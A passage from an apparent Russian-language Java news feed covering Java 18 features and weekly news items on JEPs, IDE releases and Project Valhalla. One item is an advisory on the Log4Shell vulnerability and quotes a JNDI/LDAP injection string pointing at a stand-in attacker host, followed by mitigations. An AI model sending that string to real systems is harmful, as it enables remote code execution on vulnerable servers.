&lt;p&gt;Сгенерированная документация для него будет выглядеть примерно следующим образом:&lt;/p&gt;
&lt;pre&gt;public class HelloWorld {
  public static void main(String... args) {
    System.out.&lt;b&gt;println&lt;/b&gt;("Hello World!");
  }
}&lt;/pre&gt;

&lt;p&gt;Тег &lt;code&gt;@snippet&lt;/code&gt; введён в качестве замены существующему методу вставки примеров кода в JavaDoc с помощью блоков &lt;code&gt;&amp;lt;pre&amp;gt;{@code ... }&amp;lt;/pre&amp;gt;&lt;/code&gt;, который имеет ряд недостатков:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Тег &lt;code&gt;@code&lt;/code&gt; не поддерживает возможность указания языка фрагмента, а значит теряется возможность проверки корректности кода, подсветки синтаксиса и ссылок, поскольку инструменты трактуют все такие фрагменты как простой текст.&lt;/li&gt;
  &lt;li&gt;Подсветку синтаксиса также нельзя добавить и вручную, поскольку внутренние HTML-теги будут трактоваться как часть фрагмента. Проблему можно решить через использование тега &lt;code&gt;&amp;lt;pre&amp;gt;...&amp;lt;/pre&amp;gt;&lt;/code&gt; (без &lt;code&gt;@code&lt;/code&gt;), но тогда полностью исчезает указание того, что данный фрагмент документации является кодом.&lt;/li&gt;
  &lt;li&gt;Фрагменты кода часто являются неполными или содержат плейсхолдеры и многоточия. Тег &lt;code&gt;@code&lt;/code&gt; никак не решает данную проблему.&lt;/li&gt;
  &lt;li&gt;Индентация строк во фрагменте остаётся такой, как написана в исходном коде.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Новый тег же не только решает все вышеперечисленные проблемы, но и добавляет новые возможности:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;В сниппете можно указать язык фрагмента с помощью атрибута &lt;code&gt;lang&lt;/code&gt;: &lt;code&gt;{@snippet lang=properties : ... }&lt;/code&gt;. Если язык не указан, то считается, что это Java. Проверка корректности пока ограничена только сбалансированностью фигурных скобок, но инструменты могут реализовать более сложную проверку.&lt;/li&gt;
  &lt;li&gt;Подсветка отдельных элементов фрагмента может быть сделана с помощью тега &lt;code&gt;@highlight&lt;/code&gt;, который поддерживает три стиля &lt;code&gt;bold&lt;/code&gt;, &lt;code&gt;italic&lt;/code&gt; и &lt;code&gt;highlighted&lt;/code&gt;. Все теги указываются в комментариях, поэтому полностью исчезают после генерации. Инструменты также имеют возможность сделать автоматическую подсветку синтаксиса.&lt;/li&gt;
  &lt;li&gt;Многоточия и неполные фрагменты кода возможны с помощью тега &lt;code&gt;@replace&lt;/code&gt;. Фрагмент кода до замены плейсхолдеров остаётся синтаксически валидным кодом.&lt;/li&gt;
  &lt;li&gt;В сниппете можно сделать ссылки с помощью тега &lt;code&gt;@link&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Общие отступы строк фрагмента съедаются при генерации документации.&lt;/li&gt;
  &lt;li&gt;При генерации HTML-документации стандартным доклетом сниппеты кода лучше выделяются на фоне остальной документации благодаря серому фону. Кроме того, каждый сниппет кода будет сопровождаться кнопкой копирования в буфер обмена.&lt;/li&gt;
  &lt;li&gt;Сниппеты кода могут быть внешними и подтягивать код из внешних файлов. Чтобы иметь возможность не включать весь файл в JavaDoc, поддерживаются регионы с помощью тега &lt;code&gt;@region&lt;/code&gt;. Внешние сниппеты хороши тем, что внешние файлы могут быть предварительно проверены на корректность (например, если файлы Java не будут компилироваться, то и не смогут быть включены в JavaDoc).&lt;/li&gt;
&lt;/ul&gt;

&lt;h5&gt;&lt;a href="https://openjdk.org/jeps/400"&gt;UTF-8 по умолчанию (JEP 400)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;UTF-8 теперь является кодировкой по умолчанию на всех платформах. Кодировка по умолчанию используется в таких API как &lt;code&gt;java.io&lt;/code&gt; (&lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/InputStreamReader.html"&gt;&lt;code&gt;InputStreamReader&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/FileReader.html"&gt;&lt;code&gt;FileReader&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/OutputStreamWriter.html"&gt;&lt;code&gt;OutputStreamWriter&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/FileWriter.html"&gt;&lt;code&gt;FileWriter&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/PrintStream.html"&gt;&lt;code&gt;PrintStream&lt;/code&gt;&lt;/a&gt;), &lt;code&gt;java.util&lt;/code&gt; (&lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/util/Formatter.html"&gt;&lt;code&gt;Formatter&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/util/Scanner.html"&gt;&lt;code&gt;Scanner&lt;/code&gt;&lt;/a&gt;), &lt;code&gt;java.net&lt;/code&gt; (&lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/net/URLEncoder.html"&gt;&lt;code&gt;URLEncoder&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/net/URLDecoder.html"&gt;&lt;code&gt;URLDecoder&lt;/code&gt;&lt;/a&gt;). Кодировка в пакете &lt;code&gt;java.nio.file&lt;/code&gt; осталась неизменной: в нём самого начала UTF-8 было в качестве &lt;code&gt;Charset&lt;/code&gt; по умолчанию.&lt;/p&gt;
&lt;p&gt;Если в Java 17 и более ранних версиях кодировка по умолчанию определялась при старте JVM и зависела от разных факторов (операционная система, пользовательская локаль, кодировка операционной системы), то с Java 18 она всегда UTF-8. Если нужно включить старый механизм установки кодировки при старте, то можно использовать опцию &lt;code&gt;-Dfile.encoding=COMPAT&lt;/code&gt;. Кроме того, эту кодировку можно узнать, используя свойство &lt;code&gt;native.encoding&lt;/code&gt;, которое &lt;a href="https://bugs.openjdk.java.net/browse/JDK-8265989"&gt;появилось в Java 17&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Чтобы будущий переход на Java 18 был более гладким, рекомендуется стартовать свои приложения на Java 17 или более ранних версиях с опцией &lt;code&gt;-Dfile.encoding=UTF-8&lt;/code&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.org/jeps/408"&gt;Простой веб-сервер (JEP 408)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Появилась новая утилита &lt;code&gt;jwebserver&lt;/code&gt;, которая запускает простой веб-сервер, предоставляющий статический доступ к указанной папке с файлами. По умолчанию используется текущая директория (если не указана опция &lt;code&gt;-d&lt;/code&gt;), а порт равен 8000 (если не указана опция &lt;code&gt;-p&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Веб-сервер поддерживает только HTTP/1.1, не поддерживает HTTPS и аутентификацию. Его рекомендуется использовать только для целей разработки и тестирования.&lt;/p&gt;
&lt;p&gt;Вместе с утилитой &lt;code&gt;jwebserver&lt;/code&gt; также появилось новое API, позволяющее запускать веб-сервер программно. За это отвечают новые классы &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.httpserver/com/sun/net/httpserver/SimpleFileServer.html"&gt;&lt;code&gt;SimpleFileServer&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.httpserver/com/sun/net/httpserver/HttpHandlers.html"&gt;&lt;code&gt;HttpHandlers&lt;/code&gt;&lt;/a&gt; и &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.httpserver/com/sun/net/httpserver/Request.html"&gt;&lt;code&gt;Request&lt;/code&gt;&lt;/a&gt; в пакете &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.httpserver/com/sun/net/httpserver/package-summary.html"&gt;&lt;code&gt;com.sun.net.httpserver&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.org/jeps/421"&gt;Deprecate Finalization for Removal (JEP 421)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Финализация объектов, которая &lt;a href="https://bugs.openjdk.java.net/browse/JDK-8165641"&gt;стала deprecated в Java 9&lt;/a&gt;, теперь стала deprecated for removal, то есть подлежит окончательному удалению.&lt;/p&gt;
&lt;p&gt;Начиная с Java 18, все методы, относящиеся к финализации, помечены аннотацией &lt;code&gt;@Deprecated(forRemoval=true)&lt;/code&gt;. Это &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/Object.html#finalize()"&gt;&lt;code&gt;Object.finalize()&lt;/code&gt;&lt;/a&gt; и его наследники (часть из них удалены полностью), &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/Runtime.html#runFinalization()"&gt;&lt;code&gt;Runtime.runFinalization()&lt;/code&gt;&lt;/a&gt; и &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/System.html#runFinalization()"&gt;&lt;code&gt;System.runFinalization()&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Сама финализация всё ещё работает, однако появилась новая опция &lt;code&gt;--finalization=disabled&lt;/code&gt;, которая её отключает.&lt;/p&gt;
&lt;p&gt;В будущих версиях Java работа по дальнейшему отказу от финализации может быть продолжена. Сначала финализацию предлагается отключить по умолчанию с возможностью включения, потом отключить её полностью, и, наконец, удалить весь API финализации.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.org/jeps/416"&gt;Reimplement Core Reflection with Method Handles (JEP 416)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Механизм рефлексии в пакете &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/reflect/package-summary.html"&gt;&lt;code&gt;java.lang.reflect&lt;/code&gt;&lt;/a&gt; теперь реализован поверх method handles в пакете &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/invoke/package-summary.html"&gt;&lt;code&gt;java.lang.invoke&lt;/code&gt;&lt;/a&gt;. В Java 17 и раньше эти два механизма существовали независимо и имели разную внутреннюю реализацию. Такое дублирование усложняет поддержку платформы и внесение в неё новых языковых изменений.&lt;/p&gt;
&lt;p&gt;Для разработчика такое изменение не должно иметь видимых последствий (кроме небольших различий в производительности). Однако на всякий случай предоставлен ключ, позволяющий включить старую реализацию: &lt;code&gt;-Djdk.reflect.useDirectMethodHandle=false&lt;/code&gt;. Старая реализация будет полностью удалена в одной из следующих версий Java.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.org/jeps/418"&gt;Internet-Address Resolution SPI (JEP 418)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Появилось новое SPI, позволяющее кастомизировать получение IP-адреса по имени хоста (и наоборот). По умолчанию &lt;code&gt;InetAddress&lt;/code&gt; API делает нативный резолвинг, то есть делегированием операционной системе. Если нужен альтернативный механизм резолвинга, то теперь его можно предоставить путём реализации нового провайдера сервиса &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/net/spi/InetAddressResolverProvider.html"&gt;&lt;code&gt;InetAddressResolverProvider&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Примеры случаев, когда может понадобиться альтернативный резолвинг:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Более производительный резолвинг, чем системный.&lt;/li&gt;
  &lt;li&gt;Неблокирующий резолвинг.&lt;/li&gt;
  &lt;li&gt;Альтернативный протокол DNS (например, DNS over QUIC).&lt;/li&gt;
  &lt;li&gt;Тестирование (подмена IP-адресов, моки).&lt;/li&gt;
&lt;/ul&gt;

&lt;h5&gt;&lt;a href="https://openjdk.org/jeps/419"&gt;Foreign Function &amp; Memory API (Second Incubator) (JEP 419)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Foreign Function &amp; Memory API, который &lt;a href="https://openjdk.org/jeps/412"&gt;появился в Java 17&lt;/a&gt; в инкубационном статусе, остаётся в этом статусе в модуле &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.incubator.foreign/module-summary.html"&gt;&lt;code&gt;jdk.incubator.foreign&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;В Java 19 это API перестанет быть инкубационным и &lt;a href="https://openjdk.org/jeps/424"&gt;станет preview API&lt;/a&gt; в пакете &lt;code&gt;java.lang.foreign&lt;/code&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.org/jeps/417"&gt;Vector API (Third Incubator) (JEP 417)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Векторное API, которое появилось в &lt;a href="https://openjdk.org/jeps/338"&gt;Java 16&lt;/a&gt; в инкубационном статусе, осталось в инкубационном статусе в &lt;a href="https://openjdk.org/jeps/414"&gt;Java 17&lt;/a&gt;, продолжает находиться в этом статусе в модуле &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.incubator.vector/module-summary.html"&gt;&lt;code&gt;jdk.incubator.vector&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-3"&gt;Java 18 не является LTS-релизом и будет получать обновления только в течение полугода (до сентября 2022).&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #36</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_36.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_36.html</id>
    <updated>2022-03-20T18:00:00Z</updated>
    <published>2022-03-20T18:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышел новый черновик JEP: &lt;a href="https://openjdk.org/jeps/8283291"&gt;Extended Opcodes&lt;/a&gt;. В нём предлагается расширить пространство возможных опкодов в class-файле, убрав ограничение на длину опкода в 1 байт. Это позволит решить проблему нехватки опкодов, которых сейчас осталось всего 55 (из 256 возможных). Расширение опкодов не затронет существующие опкоды, и они так и останутся однобайтовыми, а новые расширенные опкоды будут состоять из двух частей: наименее значащий байт будет отделён от остальных байтов, которые будут храниться в отдельном атрибуте. Такое решение сохранит максимальную совместимость с текущей схемой, а также сохранит компактность class-файлов.&lt;/p&gt;

&lt;p&gt;&amp;bull; Вышел &lt;a href="https://www.youtube.com/watch?v=GnNnQY5ujFg"&gt;Eclipse 2022-03&lt;/a&gt;. Перечислим некоторые нововведения и улучшения:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Новый quick assist, позволяющий быстро добавлять статический импорт в список Favorites.&lt;/li&gt;
  &lt;li&gt;Новый quick assist "Extract lambda body to method".&lt;/li&gt;
  &lt;li&gt;Теперь можно ставить брейкпоинт на вхождение в лямбду или выход из лямбды.&lt;/li&gt;
  &lt;li&gt;Возможность переходить в место объявления поля из списка переменных в дебаггере.&lt;/li&gt;
  &lt;li&gt;При изменении final поля в дебаггере теперь выдаётся предупреждение.&lt;/li&gt;
  &lt;li&gt;В дебаггере теперь отображается PID процесса (в Debug View, а также в консоли).&lt;/li&gt;
  &lt;li&gt;6 новых настроек форматирования Java-кода.&lt;/li&gt;
  &lt;li&gt;Улучшения в Maven и Git.&lt;/li&gt;
  &lt;li&gt;Возможность открывать большие файлы в редакторах, отличных от дефолтных.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&amp;bull; Вышла статья &lt;a href="https://tschatzl.github.io/2022/03/14/jdk18-g1-parallel-gc-changes.html"&gt;"JDK 18 G1/Parallel/Serial GC changes"&lt;/a&gt;, где рассказано, какие улучшения в сборщиках мусора произошли в Java 18.&lt;/p&gt;

&lt;p&gt;&amp;bull; Вышел &lt;a href="https://docs.gradle.org/7.4/release-notes.html"&gt;Gradle 7.4&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&amp;bull; Вышел &lt;a href="https://www.eclipse.org/lists/birt-dev/msg11552.html"&gt;BIRT 4.9.0&lt;/a&gt;. Это первый релиз фреймворка спустя 4 года после выхода версии 4.8.0.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #35</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_35.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_35.html</id>
    <updated>2022-03-13T18:00:00Z</updated>
    <published>2022-03-13T18:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; У JDK 19 появился первый JEP, который предложен к выходу в этом релизе. Это &lt;a href="https://openjdk.org/jeps/422"&gt;JEP 422: Linux/RISC-V Port&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Также появился новый &lt;a href="https://openjdk.org/jeps/424"&gt;JEP 424: Foreign Function &amp; Memory API (Preview)&lt;/a&gt;. Этот JEP является продолжением &lt;a href="https://openjdk.org/jeps/419"&gt;JEP 419: Foreign Function &amp; Memory API (Second Incubator)&lt;/a&gt;, однако теперь API уже не будет инкубационным, а станет preview API в пакете &lt;code&gt;java.lang.foreign&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&amp;bull; Появилось несколько черновиков JEP.&lt;/p&gt;
&lt;p&gt;В &lt;a href="https://openjdk.org/jeps/8280836"&gt;Sequenced Collections&lt;/a&gt; предлагается ввести несколько новых интерфейсов коллекций (&lt;code&gt;SequencedCollection&lt;/code&gt;, &lt;code&gt;SequencedSet&lt;/code&gt;, &lt;code&gt;SequencedMap&lt;/code&gt;), в которых элементы будут иметь установленный порядок. Сейчас в стандартной библиотеке интерфейса с такой характеристикой нет, и в случае её надобности приходится прибегать либо к слишком общему интерфейсу &lt;code&gt;Collection&lt;/code&gt;, но тогда туда будут попадать неупорядоченные коллекции (например, &lt;code&gt;HashSet&lt;/code&gt;), либо к слишком частному &lt;code&gt;List&lt;/code&gt;, куда не смогут попасть, например, &lt;code&gt;ArrayDeque&lt;/code&gt; или &lt;code&gt;LinkedHashSet&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://openjdk.org/jeps/8280173"&gt;Vector API (Fourth Incubator)&lt;/a&gt; &amp;ndash; уже четвёртая итерация Vector API. Предыдущие три попали в Java &lt;a href="https://openjdk.org/jeps/338"&gt;16&lt;/a&gt;, &lt;a href="https://openjdk.org/jeps/414"&gt;17&lt;/a&gt; и &lt;a href="https://openjdk.org/jeps/417"&gt;18&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://openjdk.org/jeps/8281710"&gt;TLS Certificate Compression&lt;/a&gt; &amp;ndash; добавление поддержки &lt;a href="https://datatracker.ietf.org/doc/html/rfc8879"&gt;сжатых цепочек сертификатов TLS&lt;/a&gt;. Это позволит ускорить соединения TLS и QUIC из-за уменьшения количества байт, необходимых для передачи во время фазы рукопожатия. Также это может улучшить безопасноть благодаря снижению возможностей атак на основе амплификации. Сжатие TLS-сертификатов уже работает в Chrome и Safari.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышел &lt;a href="https://groovy-lang.org/releasenotes/groovy-4.0.html"&gt;Groovy 4.0&lt;/a&gt;. Среди новшеств языка выражения &lt;code&gt;switch&lt;/code&gt;, &lt;code&gt;sealed&lt;/code&gt; типы, встроенные проверки типов, встроенные макро-методы, инкубационные фичи (записи, JavaShell, аннотация POJO, контракты, GINQ) и другие.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышла &lt;a href="https://netbeans.apache.org/download/nb13/index.html"&gt;Apache NetBeans 13&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышла &lt;a href="https://www.infoq.com/news/2022/01/graalvm-22-native-image/"&gt;GraalVM 22.0&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышла &lt;a href="https://www.infoq.com/news/2022/02/eclipse-collections-11-0-0/"&gt;Eclipse Collections 11.0.0&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышла &lt;a href="https://github.com/google/guava/releases/tag/v31.1"&gt;Guava 31.1&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #34</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_34.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_34.html</id>
    <updated>2021-12-12T18:00:00Z</updated>
    <published>2021-12-12T18:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Java 18 перешла в &lt;a href="https://mail.openjdk.org/pipermail/jdk-dev/2021-December/006287.html"&gt;первую фазу Rampdown&lt;/a&gt;: главный репозиторий JDK был ответвлён в &lt;a href="https://github.com/openjdk/jdk18"&gt;стабилизационный репозиторий JDK 18&lt;/a&gt;, и новых JEP'ов в этом релизе больше не будет.&lt;/p&gt;
&lt;p&gt;Одновременно с этим началась &lt;a href="https://bugs.openjdk.java.net/browse/JDK-8273146"&gt;разработка Java 19&lt;/a&gt;. У нового релиза появилась &lt;a href="https://jdk.java.net/19/"&gt;своя страница&lt;/a&gt;, где уже доступна для скачивания первая ранняя сборка JDK 19-ea+1.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В популярной библиотеке логирования Apache Log4J 2.x обнаружили &lt;a href="https://www.lunasec.io/docs/blog/log4j-zero-day/"&gt;серьёзную уязвимость&lt;/a&gt;, позволяющую выполнить на уязвимом сервере произвольный код. Уязвимость может быть эксплуатирована, если Log4J используется для параметризированного логирования непроверенного текста, приходящего от пользователя, например:&lt;/p&gt;
&lt;pre&gt;log.info(&lt;span style="color: darkred"&gt;"Сообщение от пользователя: {}"&lt;/span&gt;, userMsg);&lt;/pre&gt;
&lt;p&gt;Злоумышленник может воспользоваться этим и послать строку специального вида (&lt;code&gt;${jndi:ldap://attacker.com/a}&lt;/code&gt;), которую обработает Log4J и загрузит через JNDI вредоносный класс с LDAP-сервера, контролируемого злоумышленником. Класс будет инъектирован в Java-процесс, что позволит атакующему выполнить произвольный код с правами пользователя, от лица которого запущен процесс.&lt;/p&gt;
&lt;p&gt;Так как Apache Log4J является одной из двух самых популярных библиотек логирования в Java (наряду с Logback), то такая уязвимость поставила под угрозу огромное количество сервисов по всему миру, включая крупнейших.&lt;/p&gt;
&lt;p&gt;Наиболее надёжным способом защиты от Log4Shell (такое народное название дали этой уязвимости) является обновление Log4J до версии &lt;a href="https://search.maven.org/artifact/org.apache.logging.log4j/log4j/2.15.0/pom"&gt;2.15.0&lt;/a&gt;. Также решением является установка системного свойства &lt;code&gt;log4j2.formatMsgNoLookups=true&lt;/code&gt;, однако оно работает только для версий Log4J &lt;code&gt;2.10.0&lt;/code&gt; и выше. Кроме того, можно полностью удалить class-файл &lt;code&gt;org/apache/logging/log4j/core/lookup/JndiLookup.class&lt;/code&gt; из библиотеки.&lt;/p&gt;
&lt;p&gt;Уязвимости меньше подвержены &lt;a href="https://gist.github.com/shipilev/cfbe09a31ac32f0cc51078db7898c797"&gt;новые версии Java&lt;/a&gt; (8u191+, 11.0.1+, 13, 15, 17), однако они не защищены от всех возможных векторов атаки, поэтому полагаться на такую защиту крайне нежелательно и настоятельно рекомендуется предпринять один из вышеописанных шагов.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://www.youtube.com/watch?v=3W9bvidcO20"&gt;Eclipse 2021-12&lt;/a&gt; со следующими нововведениями:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Поддержка разработки на Java 17&lt;/li&gt;
  &lt;li&gt;Новое действие "Convert String concatenation to Text Block"&lt;/li&gt;
  &lt;li&gt;Возможность помечать объекты меткой в режиме отладки&lt;/li&gt;
  &lt;li&gt;Умная вставка текста в поле диалога Open Type (обрезание лишнего)&lt;/li&gt;
  &lt;li&gt;Новый редактор POM с возможностью автодополнения по имени артефакта/плагина и выбором из выпадающего списка версий&lt;/li&gt;
  &lt;li&gt;Новое view "Launch Configurations"&lt;/li&gt;
  &lt;li&gt;Мультикурсоры (одновременное редактирование в нескольких частях файла)&lt;/li&gt;
  &lt;li&gt;Открывание ссылок во внешнем браузере вместо внутреннего&lt;/li&gt;
  &lt;li&gt;Улучшения в тёмной теме&lt;/li&gt;
  &lt;li&gt;Улучшение времени старта IDE&lt;/li&gt;
  &lt;li&gt;Улучшения в EGit и JS-редакторе&lt;/li&gt;
&lt;/ul&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #33</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_33.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_33.html</id>
    <updated>2021-12-05T18:00:00Z</updated>
    <published>2021-12-05T18:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Ещё один JEP предложен к Java 18: &lt;a href="https://openjdk.org/jeps/421"&gt;Deprecate Finalization for Removal (JEP 421)&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В проекте Valhalla появился новый черновик JEP: &lt;a href="https://openjdk.org/jeps/8277163"&gt;Value Objects (Preview)&lt;/a&gt;. В нём предлагается ввести новый тип объектов в Java: value-объекты.&lt;/p&gt;
&lt;p&gt;Value-объекты отличаются от классических объектов тем, что не имеют identity. Это позволяет улучшить производительность при использовании таких объектов и уменьшить занимаемое ими место в памяти. Также value-объекты являются полностью иммутабельными, всегда являются &lt;code&gt;final&lt;/code&gt; и не могут иметь &lt;code&gt;synchronized&lt;/code&gt;-методов.&lt;/p&gt;
&lt;p&gt;Однако, в отличие от примитивных объектов (&lt;a href="https://openjdk.org/jeps/401"&gt;JEP 401&lt;/a&gt;), которые также имеют все вышеописанные свойства, value-объекты являются ссылочными, поэтому являются nullable.&lt;/p&gt;
&lt;p&gt;Таким образом, если в Valhalla всё будет реализовано согласно такой модели, то в Java будет три типа объектов: identity-объекты, value-объекты и примитивные объекты.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://blog.jetbrains.com/idea/2021/11/intellij-idea-2021-3/"&gt;IntelliJ IDEA 2021.3&lt;/a&gt;. Перечислим некоторые заметные изменения и улучшения:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;В Ultimate версии появилась возможность &lt;a href="https://blog.jetbrains.com/blog/2021/11/29/introducing-remote-development-for-jetbrains-ides/"&gt;удалённой разработки&lt;/a&gt;. Развернув бэкенд IDEA на удалённом сервере, к нему можно подключиться и работать из любой точки мира. Функция пока работает в Beta-режиме.&lt;/li&gt;
  &lt;li&gt;Новая функция &lt;i&gt;Repair IDE&lt;/i&gt; позволяет быстро диагностировать и устранять наиболее распространённые неполадки.&lt;/li&gt;
  &lt;li&gt;Возможность изменить шрифт во всех вкладках одновременно с помощью &lt;code&gt;Ctrl&lt;/code&gt; и колеса мыши.&lt;/li&gt;
  &lt;li&gt;Улучшенный предпросмотр результатов &lt;a href="https://www.jetbrains.com/help/idea/intention-actions.html"&gt;intention-действий&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Возможность разделения окна &lt;i&gt;Run&lt;/i&gt; на несколько вкладок.&lt;/li&gt;
  &lt;li&gt;Поиск действий в &lt;i&gt;Search Everywhere&lt;/i&gt; теперь тоже использует машинное обучение (ранее в IDEA 2020.3 машинное обучение было введено для Code Completion).&lt;/li&gt;
  &lt;li&gt;Новые инспекции в Java: отслеживание небезопасных строк (SQL-инъекция, XSS, конфиденциальные данные и т.п.), замена &lt;code&gt;collect(toList())&lt;/code&gt; на &lt;code&gt;toList()&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;При выполнении рефакторинга &lt;i&gt;Introduce Local Variable&lt;/i&gt; теперь не всплывает окно с настройками, а появляется значок шестерёнки. А при выполнении рефакторинга &lt;i&gt;Introduct Parameter&lt;/i&gt; среда теперь спрашивает, где нужно заменить вхождения, и тоже показывает значок шестерёнки.&lt;/li&gt;
  &lt;li&gt;В &lt;i&gt;Run/Debug Configurations&lt;/i&gt; теперь можно настраивать classpath, вручную добавляя туда отдельные записи или исключая ненужные.&lt;/li&gt;
  &lt;li&gt;Множество новых улучшений в Kotlin: действие &lt;i&gt;Smart Step Into&lt;/i&gt; в отладчике, &lt;code&gt;inline&lt;/code&gt;-функции в стек-трейсе, рефакторинг &lt;i&gt;Extract Constant&lt;/i&gt;, улучшенная инспекция &lt;i&gt;Possibly blocking call in non-blocking context&lt;/i&gt;, подсказки для диапазонов, улучшенный мастер создания проектов.&lt;/li&gt;
  &lt;li&gt;Async Profiler 2.0 теперь доступен в Windows-версии IntelliJ IDEA Ultimate из коробки.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Компания JetBrains анонсировала свою новую среду разработки &lt;a href="https://blog.jetbrains.com/ru/blog/2021/11/29/welcome-to-fleet/"&gt;Fleet&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Fleet &amp;ndash; это созданная с нуля среда разработки, которая представляет собой легковесный редактор с базовыми возможностями, но с возможностью включения smart-режима, при котором она превращается в полнофункциональную IDE. В отличие от классических IDE JetBrains, каждая из которых создана для одной конкретной технологии, Fleet поддерживает разные технологии в рамках одного приложения (на текущий момент есть поддержка Java, Kotlin, Python, Go, JavaScript, Rust, TypeScript, JSON). Fleet имеет &lt;a href="https://www.jetbrains.com/help/fleet/1.0/architecture-overview.html"&gt;распределённую архитектуру&lt;/a&gt;, в которой фронтенд отделён от бэкенда, что позволяет использовать среду не только локально, но и в распределённых сценариях: удалённая, облачная, совместая разработка и т.д.&lt;/p&gt;
